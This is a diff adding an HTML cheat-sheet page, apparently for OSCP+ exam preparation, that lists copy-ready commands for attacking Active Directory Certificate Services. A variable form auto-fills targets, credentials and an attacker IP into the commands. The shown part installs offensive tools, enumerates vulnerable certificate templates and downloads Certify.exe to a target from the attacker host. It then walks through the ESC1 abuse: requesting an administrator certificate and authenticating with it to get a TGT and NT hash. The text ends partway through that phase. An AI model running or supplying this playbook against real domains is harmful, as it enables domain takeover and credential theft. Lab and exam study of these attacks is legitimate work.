@@ -1,0 +1,813 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ADCS ESC1-ESC16 — OSCP+ Reference</title>
+<style>
+:root{--bg-primary:#0f172a;--bg-secondary:#1e293b;--bg-card:#1e293b;--bg-hover:#334155;--text-primary:#f1f5f9;--text-secondary:#94a3b8;--text-muted:#64748b;--border:#334155;--accent:#3b82f6;--accent-hover:#2563eb;--success:#10b981;--warning:#f59e0b;--danger:#ef4444;--purple:#8b5cf6;--orange:#f97316;--cyan:#06b6d4;--pink:#ec4899;--teal:#14b8a6;--font-mono:'SF Mono','JetBrains Mono','Fira Code',Consolas,monospace;--font-sans:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,sans-serif;--sidebar-width:220px;--header-height:60px;--radius:8px;--shadow:0 4px 6px -1px rgba(0,0,0,.3)}
+[data-theme="light"]{--bg-primary:#f8fafc;--bg-secondary:#fff;--bg-card:#fff;--bg-hover:#f1f5f9;--text-primary:#0f172a;--text-secondary:#475569;--text-muted:#94a3b8;--border:#e2e8f0;--shadow:0 4px 6px -1px rgba(0,0,0,.1)}
+*{margin:0;padding:0;box-sizing:border-box}html{scroll-behavior:smooth}
+body{font-family:var(--font-sans);background:var(--bg-primary);color:var(--text-primary);line-height:1.5;overflow-x:hidden}
+.app{display:flex;min-height:100vh}
+.sidebar{width:var(--sidebar-width);background:var(--bg-secondary);border-right:1px solid var(--border);position:fixed;height:100vh;overflow-y:auto;z-index:100;padding:16px 12px;display:flex;flex-direction:column;gap:2px}
+.sidebar-title{font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.1em;color:var(--text-muted);padding:8px 12px 4px;margin-bottom:4px}
+.phase-btn{display:flex;align-items:center;gap:8px;padding:7px 10px;border-radius:var(--radius);cursor:pointer;transition:all .15s;border:none;background:transparent;color:var(--text-secondary);font-size:12px;text-align:left;width:100%;font-family:var(--font-sans)}
+.phase-btn:hover{background:var(--bg-hover);color:var(--text-primary)}
+.phase-btn.active{background:var(--bg-hover);color:var(--text-primary);font-weight:600}
+.phase-indicator{width:3px;height:14px;border-radius:2px;flex-shrink:0}
+.phase-info{display:flex;flex-direction:column;flex:1;min-width:0}
+.phase-name{font-size:11px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.phase-count{font-size:10px;color:var(--text-muted)}
+.main{margin-left:var(--sidebar-width);flex:1;min-width:0;display:flex;flex-direction:column}
+.header{height:var(--header-height);background:var(--bg-secondary);border-bottom:1px solid var(--border);display:flex;align-items:center;padding:0 20px;gap:12px;position:sticky;top:0;z-index:50}
+.header-title{font-size:16px;font-weight:700;color:var(--text-primary);white-space:nowrap}
+.header-title span{color:var(--danger)}
+.search-box{flex:1;max-width:400px;position:relative}
+.search-box input{width:100%;padding:7px 12px 7px 32px;border-radius:var(--radius);border:1px solid var(--border);background:var(--bg-primary);color:var(--text-primary);font-size:13px;font-family:var(--font-sans);outline:none}
+.search-box input:focus{border-color:var(--accent)}
+.search-box::before{content:"🔍";position:absolute;left:9px;top:50%;transform:translateY(-50%);font-size:13px;opacity:.5}
+.header-stats{font-size:12px;color:var(--text-secondary);white-space:nowrap}
+.header-stats b{color:var(--accent)}
+.header-controls{display:flex;gap:6px}
+.btn-icon{width:34px;height:34px;border-radius:var(--radius);border:1px solid var(--border);background:var(--bg-primary);color:var(--text-secondary);cursor:pointer;display:flex;align-items:center;justify-content:center;font-size:15px;transition:all .15s}
+.btn-icon:hover{background:var(--bg-hover);color:var(--text-primary)}
+.vars-bar{background:var(--bg-secondary);border-bottom:1px solid var(--border);padding:8px 20px;position:sticky;top:var(--header-height);z-index:45}
+.vars-toggle-btn{display:flex;align-items:center;gap:8px;background:var(--accent);color:#fff;border:none;border-radius:var(--radius);padding:7px 16px;font-size:13px;font-weight:600;cursor:pointer;transition:all .15s}
+.vars-toggle-btn:hover{background:var(--accent-hover)}
+.vars-body{background:var(--bg-secondary);border-bottom:2px solid var(--accent);padding:0 20px;max-height:0;overflow:hidden;transition:max-height .28s ease,padding .28s ease}
+.vars-body.open{max-height:58vh;overflow-y:auto;overflow-x:hidden;padding:14px 20px}
+.vars-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:10px;margin-bottom:12px}
+@media(max-width:1100px){.vars-grid{grid-template-columns:repeat(2,1fr)}}
+.var-group{background:var(--bg-card);border:1px solid var(--border);border-radius:var(--radius);overflow:hidden;display:flex;flex-direction:column}
+.var-group:nth-child(1){border-top:2px solid var(--cyan)}
+.var-group:nth-child(2){border-top:2px solid var(--purple)}
+.var-group:nth-child(3){border-top:2px solid var(--warning)}
+.var-group:nth-child(4){border-top:2px solid var(--danger)}
+.var-group-title{font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.1em;padding:8px 12px 7px;display:flex;align-items:center;gap:7px;border-bottom:1px solid var(--border);background:rgba(255,255,255,.02)}
+.var-group:nth-child(1) .var-group-title{color:var(--cyan)}
+.var-group:nth-child(2) .var-group-title{color:var(--purple)}
+.var-group:nth-child(3) .var-group-title{color:var(--warning)}
+.var-group:nth-child(4) .var-group-title{color:var(--danger)}
+.var-group-body{padding:10px 12px;display:flex;flex-direction:column;gap:6px;flex:1}
+.var-row{display:grid;grid-template-columns:108px 1fr;align-items:center;gap:8px}
+.var-label{font-size:10px;font-family:var(--font-mono);color:var(--text-secondary);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.var-input{width:100%;background:var(--bg-primary);border:1px solid var(--border);border-radius:4px;padding:5px 8px;font-size:11px;font-family:var(--font-mono);color:var(--text-primary);outline:none;transition:border-color .15s,box-shadow .15s;min-width:0}
+.var-input:focus{border-color:var(--accent);box-shadow:0 0 0 2px rgba(59,130,246,.15)}
+.var-input.filled{border-color:var(--success);background:rgba(16,185,129,.06)}
+.vars-actions{display:flex;gap:8px;align-items:center;flex-wrap:wrap;padding-top:10px;margin-top:2px;border-top:1px solid var(--border)}
+.vars-btn{padding:5px 14px;border-radius:6px;font-size:12px;cursor:pointer;font-weight:600;transition:all .15s;display:flex;align-items:center;gap:5px;border:1px solid transparent}
+.vars-btn.save{background:rgba(16,185,129,.12);color:var(--success);border-color:rgba(16,185,129,.25)}
+.vars-btn.save:hover{background:var(--success);color:#fff;border-color:var(--success)}
+.vars-btn.load{background:rgba(245,158,11,.12);color:var(--warning);border-color:rgba(245,158,11,.25)}
+.vars-btn.load:hover{background:var(--warning);color:#000;border-color:var(--warning)}
+.vars-btn.clear{background:rgba(239,68,68,.12);color:var(--danger);border-color:rgba(239,68,68,.25)}
+.vars-btn.clear:hover{background:var(--danger);color:#fff;border-color:var(--danger)}
+.vars-hint{font-size:11px;color:var(--text-muted);margin-left:auto}
+.content{padding:20px;flex:1}
+.phase-section{margin-bottom:28px}
+.phase-header{display:flex;align-items:center;gap:12px;margin-bottom:14px;padding-bottom:10px;border-bottom:2px solid var(--border);cursor:pointer;user-select:none}
+.phase-header:hover{border-bottom-color:var(--accent)}
+.phase-header-bar{width:4px;height:22px;border-radius:2px;flex-shrink:0}
+.phase-header-title{font-size:17px;font-weight:700;flex:1}
+.phase-header-count{font-size:12px;color:var(--text-muted);background:var(--bg-secondary);padding:3px 10px;border-radius:20px}
+.phase-header-toggle{font-size:12px;color:var(--text-muted);transition:transform .2s}
+.phase-header-toggle.collapsed{transform:rotate(-90deg)}
+.phase-commands{display:flex;flex-direction:column;gap:6px}
+.phase-commands.collapsed{display:none}
+.cmd-card{background:var(--bg-card);border:1px solid var(--border);border-radius:var(--radius);transition:all .15s;position:relative;overflow:hidden}
+.cmd-card:hover{border-color:var(--accent);box-shadow:var(--shadow)}
+.cmd-card-border{position:absolute;left:0;top:0;bottom:0;width:3px}
+.cmd-card-inner{padding:10px 14px;display:flex;align-items:flex-start;gap:10px}
+.cmd-number{font-family:var(--font-mono);font-size:11px;color:var(--text-muted);min-width:26px;padding-top:2px;flex-shrink:0}
+.cmd-content{flex:1;min-width:0;display:flex;flex-direction:column;gap:5px}
+.cmd-label{font-size:11px;font-weight:600;color:var(--warning);text-transform:uppercase;letter-spacing:.05em}
+.cmd-text{font-family:var(--font-mono);font-size:12px;color:var(--text-primary);word-break:break-all;line-height:1.7;cursor:pointer;padding:3px 6px;margin:-3px -6px;border-radius:4px;transition:background .1s;white-space:pre-wrap}
+.cmd-text:hover{background:var(--bg-hover)}
+.cmd-meta{display:flex;align-items:center;gap:10px;flex-wrap:wrap}
+.cmd-source{font-size:10px;color:var(--text-muted);background:var(--bg-primary);padding:2px 7px;border-radius:4px;font-family:var(--font-mono)}
+.cmd-tags{display:flex;gap:4px;flex-wrap:wrap}
+.cmd-tag{font-size:9px;padding:1px 6px;border-radius:10px;font-weight:600;text-transform:uppercase}
+.tag-alt{background:rgba(139,92,246,.2);color:var(--purple)}
+.tag-tip{background:rgba(245,158,11,.2);color:var(--warning)}
+.tag-warn{background:rgba(239,68,68,.2);color:var(--danger)}
+.tag-win{background:rgba(59,130,246,.2);color:var(--accent)}
+.tag-linux{background:rgba(16,185,129,.2);color:var(--success)}
+.tag-fail{background:rgba(239,68,68,.15);color:#fca5a5}
+.cmd-copy-btn{padding:3px 10px;border-radius:4px;border:1px solid var(--border);background:var(--bg-primary);color:var(--text-secondary);font-size:11px;cursor:pointer;font-family:var(--font-sans);transition:all .1s;white-space:nowrap;flex-shrink:0}
+.cmd-copy-btn:hover{background:var(--accent);color:#fff;border-color:var(--accent)}
+.cmd-copy-btn.copied{background:var(--success);color:#fff;border-color:var(--success)}
+.desc-block{background:var(--bg-card);border:1px solid var(--border);border-left:3px solid;border-radius:var(--radius);padding:10px 14px;margin-bottom:6px;font-size:12px;line-height:1.6}
+.desc-block.tip{border-left-color:var(--warning)}
+.desc-block.warn{border-left-color:var(--danger)}
+.desc-block.info{border-left-color:var(--cyan)}
+.desc-block.success{border-left-color:var(--success)}
+.desc-block code{font-family:var(--font-mono);font-size:11px;background:var(--bg-hover);padding:1px 4px;border-radius:3px;color:var(--cyan)}
+.sub-header{font-size:13px;font-weight:700;color:var(--text-secondary);margin:14px 0 8px;display:flex;align-items:center;gap:8px;border-bottom:1px solid var(--border);padding-bottom:6px}
+.sub-dot{width:8px;height:8px;border-radius:50%;flex-shrink:0}
+.toast{position:fixed;bottom:20px;right:20px;background:var(--success);color:#fff;padding:9px 16px;border-radius:var(--radius);font-size:12px;font-weight:500;z-index:1000;opacity:0;transform:translateY(10px);transition:all .3s;pointer-events:none;box-shadow:var(--shadow)}
+.toast.show{opacity:1;transform:translateY(0)}
+.empty-state{text-align:center;padding:60px 20px;color:var(--text-muted)}
+.empty-state h3{font-size:17px;margin-bottom:8px;color:var(--text-secondary)}
+.modal{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.7);z-index:200;display:none;align-items:center;justify-content:center}
+.modal.show{display:flex}
+.modal-content{background:var(--bg-secondary);border:1px solid var(--border);border-radius:var(--radius);padding:22px;max-width:420px;width:90%}
+.modal-title{font-size:15px;font-weight:700;margin-bottom:14px}
+.shortcut-row{display:flex;justify-content:space-between;padding:7px 0;border-bottom:1px solid var(--border);font-size:12px}
+.shortcut-key{font-family:var(--font-mono);background:var(--bg-primary);padding:2px 7px;border-radius:3px;font-size:11px}
+mark{background:rgba(245,158,11,.3);color:inherit;padding:0 2px;border-radius:2px}
+::-webkit-scrollbar{width:7px}::-webkit-scrollbar-track{background:var(--bg-primary)}::-webkit-scrollbar-thumb{background:var(--border);border-radius:4px}
+@media(max-width:900px){.sidebar{transform:translateX(-100%)}.main{margin-left:0}}
+</style>
+</head>
+<body>
+<div class="app">
+<aside class="sidebar" id="sidebar">
+  <div class="sidebar-title">ADCS ESC* Ref</div>
+  <div id="phase-nav"></div>
+  <div style="margin-top:auto;padding:10px;font-size:10px;color:var(--text-muted);">Press <kbd style="font-family:var(--font-mono);background:var(--bg-primary);padding:1px 4px;border-radius:3px;">?</kbd> shortcuts</div>
+</aside>
+<main class="main">
+  <header class="header">
+    <div class="header-title">ADCS<span>ESC*</span></div>
+    <div class="search-box"><input type="text" id="search" placeholder="Search commands... (Press / to focus)" autocomplete="off"></div>
+    <div class="header-stats">Showing <b id="showing">0</b> items</div>
+    <div class="header-controls">
+      <button class="btn-icon" id="theme-toggle" title="Toggle theme">&#127763;</button>
+      <button class="btn-icon" id="help-btn" title="Keyboard shortcuts">&#9000;&#65039;</button>
+    </div>
+  </header>
+  <div class="vars-bar">
+    <button class="vars-toggle-btn" id="vars-toggle">&#9889; TARGET VARIABLES &#8212; Click to fill all commands automatically</button>
+  </div>
+  <div class="vars-body" id="vars-body">
+      <div class="vars-grid">
+        <div class="var-group">
+          <div class="var-group-title">&#127758; Network</div>
+          <div class="var-group-body">
+            <div class="var-row"><span class="var-label">DC_IP</span><input class="var-input" id="v_DC_IP" placeholder="10.10.10.10" data-var="DC_IP"></div>
+            <div class="var-row"><span class="var-label">DC_FQDN</span><input class="var-input" id="v_DC_FQDN" placeholder="DC01.corp.local" data-var="DC_FQDN"></div>
+            <div class="var-row"><span class="var-label">CA_HOST</span><input class="var-input" id="v_CA_HOST" placeholder="DC01.corp.local" data-var="CA_HOST"></div>
+            <div class="var-row"><span class="var-label">ATTACKER_IP</span><input class="var-input" id="v_ATTACKER_IP" placeholder="10.10.14.5" data-var="ATTACKER_IP"></div>
+            <div class="var-row"><span class="var-label">IFACE</span><input class="var-input" id="v_IFACE" placeholder="tun0" data-var="IFACE"></div>
+            <div class="var-row"><span class="var-label">LPORT</span><input class="var-input" id="v_LPORT" placeholder="4444" data-var="LPORT"></div>
+          </div>
+        </div>
+        <div class="var-group">
+          <div class="var-group-title">&#127968; Domain</div>
+          <div class="var-group-body">
+            <div class="var-row"><span class="var-label">DOMAIN</span><input class="var-input" id="v_DOMAIN" placeholder="corp.local" data-var="DOMAIN"></div>
+            <div class="var-row"><span class="var-label">DOMAIN_SHORT</span><input class="var-input" id="v_DOMAIN_SHORT" placeholder="CORP" data-var="DOMAIN_SHORT"></div>
+            <div class="var-row"><span class="var-label">CA_NAME</span><input class="var-input" id="v_CA_NAME" placeholder="corp-DC-CA" data-var="CA_NAME"></div>
+            <div class="var-row"><span class="var-label">TEMPLATE</span><input class="var-input" id="v_TEMPLATE" placeholder="UserAuthentication" data-var="TEMPLATE"></div>
+            <div class="var-row"><span class="var-label">TARGET_USER</span><input class="var-input" id="v_TARGET_USER" placeholder="administrator" data-var="TARGET_USER"></div>
+            <div class="var-row"><span class="var-label">TARGET_UPN</span><input class="var-input" id="v_TARGET_UPN" placeholder="administrator@corp.local" data-var="TARGET_UPN"></div>
+          </div>
+        </div>
+        <div class="var-group">
+          <div class="var-group-title">&#128273; Credentials</div>
+          <div class="var-group-body">
+            <div class="var-row"><span class="var-label">USERNAME</span><input class="var-input" id="v_USERNAME" placeholder="ryan.cooper" data-var="USERNAME"></div>
+            <div class="var-row"><span class="var-label">PASSWORD</span><input class="var-input" id="v_PASSWORD" placeholder="NuclearMosquito3" data-var="PASSWORD"></div>
+            <div class="var-row"><span class="var-label">NTHASH</span><input class="var-input" id="v_NTHASH" placeholder="aad3b435b51404ee..." data-var="NTHASH"></div>
+            <div class="var-row"><span class="var-label">AESKEY</span><input class="var-input" id="v_AESKEY" placeholder="a3b435b5..." data-var="AESKEY"></div>
+          </div>
+        </div>
+        <div class="var-group">
+          <div class="var-group-title">&#9876;&#65039; Attack Vars</div>
+          <div class="var-group-body">
+            <div class="var-row"><span class="var-label">TARGET_SID</span><input class="var-input" id="v_TARGET_SID" placeholder="S-1-5-21-...-500" data-var="TARGET_SID"></div>
+            <div class="var-row"><span class="var-label">VICTIM_USER</span><input class="var-input" id="v_VICTIM_USER" placeholder="ca_operator" data-var="VICTIM_USER"></div>
+            <div class="var-row"><span class="var-label">VICTIM_HASH</span><input class="var-input" id="v_VICTIM_HASH" placeholder="b4b86f45c60..." data-var="VICTIM_HASH"></div>
+            <div class="var-row"><span class="var-label">REQUEST_ID</span><input class="var-input" id="v_REQUEST_ID" placeholder="13" data-var="REQUEST_ID"></div>
+            <div class="var-row"><span class="var-label">PFX_FILE</span><input class="var-input" id="v_PFX_FILE" placeholder="administrator.pfx" data-var="PFX_FILE"></div>
+            <div class="var-row"><span class="var-label">COMPUTER_NAME</span><input class="var-input" id="v_COMPUTER_NAME" placeholder="EVIL$" data-var="COMPUTER_NAME"></div>
+            <div class="var-row"><span class="var-label">COMPUTER_PASS</span><input class="var-input" id="v_COMPUTER_PASS" placeholder="EvilP@ss123" data-var="COMPUTER_PASS"></div>
+          </div>
+        </div>
+      </div>
+      <div class="vars-actions">
+        <button class="vars-btn save" onclick="saveVars()">&#128190; Save</button>
+        <button class="vars-btn load" onclick="loadVars()">&#128194; Load</button>
+        <button class="vars-btn clear" onclick="clearVars()">&#128465; Clear</button>
+        <span class="vars-hint">&#9889; Values auto-inject into every command. Green border = filled.</span>
+      </div>
+  </div>
+  <div class="content" id="content"></div>
+</main>
+</div>
+<div class="toast" id="toast">Copied!</div>
+<div class="modal" id="modal">
+  <div class="modal-content">
+    <div class="modal-title">Keyboard Shortcuts</div>
+    <div class="shortcut-row"><span>Focus search</span><span class="shortcut-key">/</span></div>
+    <div class="shortcut-row"><span>Clear search</span><span class="shortcut-key">Esc</span></div>
+    <div class="shortcut-row"><span>Toggle theme</span><span class="shortcut-key">T</span></div>
+    <div class="shortcut-row"><span>Toggle variables</span><span class="shortcut-key">V</span></div>
+    <div class="shortcut-row"><span>Jump phase 0-9</span><span class="shortcut-key">0-9</span></div>
+    <div style="margin-top:12px;font-size:11px;color:var(--text-muted);">Click any command to copy</div>
+    <button class="cmd-copy-btn" style="margin-top:12px;width:100%;" id="close-modal">Close</button>
+  </div>
+</div>
+<script>
+const PHASES = [
+{phase:0,phaseName:'Tool Installation',shortName:'Install',color:'#6366f1',items:[
+{type:'desc',cls:'info',text:'<strong>Install ALL tools BEFORE the exam.</strong> Certipy v5.0.2+ is REQUIRED for ESC15/ESC16. Run these once on Kali before any engagement.'},
+{type:'sub',label:'certipy-ad (PRIMARY tool)'},
+{num:1,cmd:'sudo apt install -y pipx python3-pip build-essential libssl-dev libffi-dev python3-dev krb5-user',src:'System deps',tags:['linux'],label:'System dependencies first'},
+{num:2,cmd:'pipx install certipy-ad && pipx ensurepath && source ~/.bashrc',src:'pipx (recommended)',tags:['linux'],label:'pipx install'},
+{num:3,cmd:'pip install certipy-ad --break-system-packages',src:'pip fallback',tags:['linux','alt'],label:'pip fallback if pipx fails'},
+{num:4,cmd:'pip install --force-reinstall certipy-ad==5.0.2 --break-system-packages',src:'pin version',tags:['linux','tip'],label:'Pin v5.0.2 (ESC15/16 support)'},
+{num:5,cmd:'git clone https://github.com/ly4k/Certipy && cd Certipy && pip install . --break-system-packages',src:'git latest',tags:['linux','alt'],label:'Latest from git'},
+{num:6,cmd:'certipy --version',src:'verify',tags:['linux'],label:'Verify >= 5.0.2'},
+{type:'desc',cls:'warn',text:'<strong>If impacket conflict:</strong> <code>pip install --upgrade impacket --break-system-packages</code> then reinstall certipy-ad'},
+{type:'sub',label:'PKINITtools (needed when certipy auth PKINIT fails)'},
+{num:7,cmd:'git clone https://github.com/dirkjanm/PKINITtools && cd PKINITtools && pip install impacket minikerberos oscrypto --break-system-packages',src:'PKINITtools',tags:['linux']},
+{type:'sub',label:'pywhisker (Shadow Credentials alternative)'},
+{num:8,cmd:'pipx install git+https://github.com/ShutdownRepo/pywhisker',src:'pywhisker',tags:['linux']},
+{type:'sub',label:'bloodyAD (LDAP modifications)'},
+{num:9,cmd:'pipx install bloodyAD',src:'bloodyAD',tags:['linux']},
+{type:'sub',label:'PassTheCert (Schannel fallback when PKINIT fails)'},
+{num:10,cmd:'git clone https://github.com/AlmondOffSec/PassTheCert && cd PassTheCert/Python && pip install impacket ldap3 --break-system-packages',src:'PassTheCert',tags:['linux']},
+{type:'sub',label:'Impacket + NetExec'},
+{num:11,cmd:'pip install impacket --upgrade --break-system-packages',src:'impacket',tags:['linux']},
+{num:12,cmd:'pipx install git+https://github.com/Pennyw0rth/NetExec',src:'NetExec/nxc',tags:['linux']},
+{type:'sub',label:'Coercion tools (for ESC8/ESC11)'},
+{num:13,cmd:'git clone https://github.com/topotam/PetitPotam',src:'PetitPotam',tags:['linux']},
+{num:14,cmd:'pip install coercer --break-system-packages',src:'Coercer',tags:['linux']},
+{num:15,cmd:'git clone https://github.com/Wh04m1001/DFSCoerce',src:'DFSCoerce',tags:['linux','alt']},
+{num:16,cmd:'wget https://raw.githubusercontent.com/dirkjanm/krbrelayx/master/printerbug.py',src:'printerbug',tags:['linux','alt']},
+{type:'sub',label:'Windows tools (transfer to target with SMB server)'},
+{num:17,cmd:'sudo impacket-smbserver share . -smb2support',src:'SMB serve',tags:['linux'],label:'Host files for Windows target'},
+{num:18,cmd:'wget https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/Certify.exe',src:'Certify.exe',tags:['linux']},
+{num:19,cmd:'wget https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/Rubeus.exe',src:'Rubeus.exe',tags:['linux']},
+{num:20,cmd:'certutil -urlcache -split -f http://${ATTACKER_IP}/Certify.exe C:\\Windows\\Temp\\Certify.exe',src:'Windows download',tags:['win'],label:'Download to Windows target'},
+{type:'desc',cls:'tip',text:'<strong>ALWAYS sync time first:</strong> <code>sudo ntpdate -u DC_IP</code> — Clock skew kills ALL Kerberos. Most mysterious errors are actually clock skew.'}
+]},
+{phase:1,phaseName:'Detect ADCS and Templates',shortName:'Detect',color:'#06b6d4',items:[
+{type:'desc',cls:'info',text:'<strong>STEP 1 on every box: run certipy find.</strong> Use ALL alternatives if primary fails. Import bloodhound output into BloodHound CE for ADCSESC* edges automatically.'},
+{type:'sub',label:'Primary Detection'},
+{num:1,cmd:'certipy find -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -vulnerable -enabled -stdout',src:'certipy find',tags:['linux'],label:'Primary: vulnerable+enabled only'},
+{num:2,cmd:'certipy find -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -vulnerable -text -json -bloodhound -output adcs_audit',src:'certipy all formats',tags:['linux'],label:'All formats + BloodHound import'},
+{num:3,cmd:'certipy find -u ${USERNAME}@${DOMAIN} -hashes :${NTHASH} -dc-ip ${DC_IP} -vulnerable -stdout',src:'certipy hash auth',tags:['linux'],label:'Hash authentication'},
+{num:4,cmd:'certipy find -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -scheme ldap -vulnerable -stdout',src:'certipy LDAP',tags:['linux','fail'],label:'If LDAPS broken: use port 389'},
+{num:5,cmd:'certipy find -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -dc-only -stdout',src:'certipy dc-only',tags:['linux','fail'],label:'If CA host unreachable via RPC'},
+{num:6,cmd:'certipy find -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -no-ldap-channel-binding -no-ldap-signing -vulnerable -stdout',src:'certipy no-signing',tags:['linux','fail'],label:'If LDAP channel binding enforced'},
+{num:7,cmd:'certipy find -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -vulnerable -oids -stdout',src:'certipy +OIDs',tags:['linux'],label:'With OID data (needed for ESC13)'},
+{type:'sub',label:'Alternative 1: NetExec'},
+{num:8,cmd:'nxc ldap ${DC_IP} -u ${USERNAME} -p "${PASSWORD}" -M adcs',src:'nxc adcs',tags:['linux','alt']},
+{type:'sub',label:'Alternative 2: Certify.exe (Windows)'},
+{num:9,cmd:'Certify.exe cas',src:'Certify',tags:['win','alt'],label:'List all CAs'},
+{num:10,cmd:'Certify.exe find /vulnerable',src:'Certify',tags:['win','alt'],label:'Find vulnerable templates'},
+{num:11,cmd:'Certify.exe find /enrolleeSuppliesSubject /clientauth',src:'Certify ESC1',tags:['win','alt'],label:'ESC1 specific detection'},
+{type:'sub',label:'Alternative 3: certutil (signed Windows binary, no AV)'},
+{num:12,cmd:'certutil -TCAInfo',src:'certutil',tags:['win','alt'],label:'List CAs'},
+{num:13,cmd:'certutil -config "${DC_FQDN}\\\\${CA_NAME}" -getreg policy\\\\EditFlags',src:'certutil ESC6',tags:['win','alt'],label:'Check ESC6 flag (EDITF_ATTRIBUTESUBJECTALTNAME2)'},
+{num:14,cmd:'certutil -config "${DC_FQDN}\\\\${CA_NAME}" -getreg policy\\\\DisableExtensionList',src:'certutil ESC16',tags:['win','alt'],label:'Check ESC16 flag'},
+{num:15,cmd:'certutil -config "${DC_FQDN}\\\\${CA_NAME}" -getreg CA\\\\InterfaceFlags',src:'certutil ESC11',tags:['win','alt'],label:'Check ESC11 flag'},
+{type:'sub',label:'Alternative 4: PowerView (Windows)'},
+{num:16,cmd:'Get-DomainCA -Domain ${DOMAIN}',src:'PowerView',tags:['win','alt']},
+{num:17,cmd:'Get-DomainCATemplate -Domain ${DOMAIN} | Where-Object {($_.msPKI-Certificate-Name-Flag -band 1) -and ($_.pkiextendedkeyusage -match "1.3.6.1.5.5.7.3.2")}',src:'PowerView ESC1',tags:['win','alt']},
+{type:'sub',label:'Alternative 5: ldapsearch (last resort)'},
+{num:18,cmd:'ldapsearch -x -H ldap://${DC_IP} -D "${USERNAME}@${DOMAIN}" -w "${PASSWORD}" -b "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" "(objectClass=pKICertificateTemplate)" cn msPKI-Certificate-Name-Flag pKIExtendedKeyUsage msPKI-Enrollment-Flag 2>/dev/null',src:'ldapsearch',tags:['linux','alt'],label:'Manual LDAP enum - replace DC=corp,DC=local'},
+{type:'sub',label:'BloodHound CE Cypher (after importing certipy -bloodhound output)'},
+{num:19,cmd:'MATCH p=shortestPath((n)-[:ADCSESC1|ADCSESC3|ADCSESC4|ADCSESC6a|ADCSESC6b|ADCSESC7|ADCSESC9a|ADCSESC9b|ADCSESC10a|ADCSESC10b|ADCSESC13|ADCSESC14|CoerceAndRelayNTLMToADCS*1..]->(d:Domain)) WHERE d.name="${DOMAIN}" RETURN p',src:'BloodHound Cypher',tags:['linux'],label:'All ADCS paths to domain'},
+{type:'desc',cls:'tip',text:'<strong>Flag cheatsheet:</strong> msPKI-Certificate-Name-Flag bit 0x1 = ENROLLEE_SUPPLIES_SUBJECT (ESC1) | msPKI-Enrollment-Flag bit 0x80000 = NO_SECURITY_EXTENSION (ESC9/10/16) | ESC6: look for EDITF_ATTRIBUTESUBJECTALTNAME2 in EditFlags'}
+]},
+{phase:2,phaseName:'ESC1: Enrollee Supplies Subject',shortName:'ESC1',color:'#ef4444',items:[
+{type:'desc',cls:'warn',text:'<strong>ESC1 Conditions:</strong> Template has ENROLLEE_SUPPLIES_SUBJECT flag + Client Auth EKU + No Manager Approval + low-priv user can Enroll. Machines: HTB Escape, Authority (via MAQ), Vulnlab Hybrid, Retro, Sendai.'},
+{type:'sub',label:'STEP 1: Sync Clock (CRITICAL - do before anything)'},
+{num:1,cmd:'sudo ntpdate -u ${DC_IP}',src:'ntpdate',tags:['linux'],label:'Sync clock - MANDATORY before any Kerberos op'},
+{num:2,cmd:'sudo rdate -n ${DC_IP}',src:'rdate',tags:['linux','alt'],label:'Alternative time sync'},
+{type:'sub',label:'STEP 2: Get Target SID (mandatory post-Feb 2025)'},
+{num:3,cmd:'certipy account read -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -user ${TARGET_USER}',src:'certipy read SID',tags:['linux'],label:'Read TARGET_SID - fill the variable above!'},
+{num:4,cmd:'nxc ldap ${DC_IP} -u ${USERNAME} -p "${PASSWORD}" --get-sid',src:'nxc get-sid',tags:['linux','alt']},
+{num:5,cmd:'impacket-lookupsid "${DOMAIN}/${USERNAME}:${PASSWORD}@${DC_IP}" | grep -i "domain sid"',src:'lookupsid',tags:['linux','alt']},
+{type:'sub',label:'STEP 3: Request Certificate as Administrator (Linux)'},
+{num:6,cmd:'certipy req -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -target ${CA_HOST} -ca "${CA_NAME}" -template "${TEMPLATE}" -upn ${TARGET_UPN} -sid ${TARGET_SID}',src:'certipy req',tags:['linux'],label:'Standard ESC1 - upn for users'},
+{num:7,cmd:'certipy req -u ${USERNAME}@${DOMAIN} -hashes :${NTHASH} -dc-ip ${DC_IP} -target ${CA_HOST} -ca "${CA_NAME}" -template "${TEMPLATE}" -upn ${TARGET_UPN} -sid ${TARGET_SID}',src:'certipy req hash',tags:['linux','alt'],label:'With NT hash auth'},
+{num:8,cmd:'certipy req -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -target ${CA_HOST} -ca "${CA_NAME}" -template "${TEMPLATE}" -upn ${TARGET_UPN} -sid ${TARGET_SID} -key-size 4096',src:'certipy req 4096',tags:['linux','alt'],label:'4096 key (Hybrid/Retro/Sendai require this)'},
+{num:9,cmd:'certipy req -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -target ${CA_HOST} -ca "${CA_NAME}" -template "${TEMPLATE}" -dns ${DC_FQDN} -sid ${TARGET_SID}',src:'certipy req DNS',tags:['linux','alt'],label:'Machine template: use -dns not -upn'},
+{type:'sub',label:'STEP 4: Authenticate'},
+{num:10,cmd:'certipy auth -pfx ${PFX_FILE} -dc-ip ${DC_IP}',src:'certipy auth',tags:['linux'],label:'Get TGT + NT hash (UnPAC-the-hash)'},
